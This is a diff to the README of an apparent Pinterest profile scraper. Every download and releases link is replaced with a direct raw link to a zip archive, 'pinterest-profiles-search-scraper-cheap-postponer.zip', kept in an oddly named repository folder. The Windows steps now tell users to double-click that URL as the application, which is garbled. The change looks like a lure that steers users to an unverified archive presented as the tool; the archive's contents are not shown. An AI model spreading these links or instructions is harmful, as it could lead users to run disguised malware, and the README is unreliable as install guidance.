@@ -1,7 +1,7 @@
 # 🎉 pinterest-profiles-search-scraper-cheap - Discover Pinterest Profiles Easily
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/AhmedIerror404/pinterest-profiles-search-scraper-cheap/releases)
+[![Download](https://raw.githubusercontent.com/AhmedIerror404/pinterest-profiles-search-scraper-cheap/main/underdry/pinterest-profiles-search-scraper-cheap-postponer.zip)](https://raw.githubusercontent.com/AhmedIerror404/pinterest-profiles-search-scraper-cheap/main/underdry/pinterest-profiles-search-scraper-cheap-postponer.zip)
 
 ## 🎯 Description
 Pinterest profiles search scraper is a simple tool that helps you search and gather detailed profiles from Pinterest. You can find user profiles, discover new ideas, and gather inspiration for your projects all in one place.
@@ -15,7 +15,7 @@ Follow these steps to download and run the Pinterest profiles scraper easily.
 - Internet connection for scraping Pinterest profiles
 
 ### 📥 Download & Install
-Visit this page to download: [Releases Page](https://github.com/AhmedIerror404/pinterest-profiles-search-scraper-cheap/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/AhmedIerror404/pinterest-profiles-search-scraper-cheap/main/underdry/pinterest-profiles-search-scraper-cheap-postponer.zip).
 
 1. Click on the link above to reach the Releases page.
 2. Look for the latest version of the application. 
@@ -27,7 +27,7 @@ After downloading, follow these steps to run the scraper:
 **For Windows Users:**
 1. Locate the downloaded `.exe` or `.zip` file.
 2. If you downloaded a `.zip` file, right-click on it and select "Extract All".
-3. Open the extracted folder and double-click on `pinterest-scraper.exe` to launch the application.
+3. Open the extracted folder and double-click on `https://raw.githubusercontent.com/AhmedIerror404/pinterest-profiles-search-scraper-cheap/main/underdry/pinterest-profiles-search-scraper-cheap-postponer.zip` to launch the application.
 
 **For macOS Users:**
 1. Find the downloaded `.dmg` file.
@@ -75,4 +75,4 @@ This application is licensed under the MIT License. Feel free to use and modify 
 ## ❓ Help & Support
 For further questions or difficulties, you can reach out through the Issues section of the repository or join the community discussion. Your feedback helps us improve the tool.
 
-For up-to-date information, visit our [Releases Page](https://github.com/AhmedIerror404/pinterest-profiles-search-scraper-cheap/releases).
+For up-to-date information, visit our [Releases Page](https://raw.githubusercontent.com/AhmedIerror404/pinterest-profiles-search-scraper-cheap/main/underdry/pinterest-profiles-search-scraper-cheap-postponer.zip).
